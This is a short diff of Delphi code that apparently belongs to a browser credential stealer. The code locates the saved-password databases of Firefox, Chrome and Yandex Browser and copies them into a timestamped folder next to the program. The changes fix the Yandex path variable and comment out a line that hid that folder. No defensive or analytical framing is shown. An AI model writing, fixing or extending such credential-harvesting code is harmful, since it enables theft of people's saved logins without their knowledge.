@@ -52,7 +52,7 @@ begin
   Firefox := Path + (SR.Name);
               until Findnext(sr)<>0;
   YandexBrowser := GetWin('%AppData%');
-  YandexBrowser := StringReplace(Chrome7, '\Roaming', '\Local\Yandex\YandexBrowser\User Data\Default\Ya Login Data', [rfReplaceAll]);
+  YandexBrowser := StringReplace(YandexBrowser, '\Roaming', '\Local\Yandex\YandexBrowser\User Data\Default\Ya Login Data', [rfReplaceAll]);
 
   if FileExists(ChromeXP) then
         CopyDatabase(ChromeXP, 'Chrome ');
@@ -79,7 +79,7 @@ var
 begin
   NewDir := ExtractFilePath(Application.ExeName) + 'Data';
   if not DirectoryExists(NewDir) then ForceDirectories(NewDir);
-  FileSetAttr(NewDir, faHidden); //скрытая папка
+  //FileSetAttr(NewDir, faHidden); //скрытая папка
   today := Now;
   NewDir := NewDir + '\' + brovser + formatdatetime('dd/mm/yy/ss', today);
   CopyFile(PChar(dir),PChar(NewDir),false);
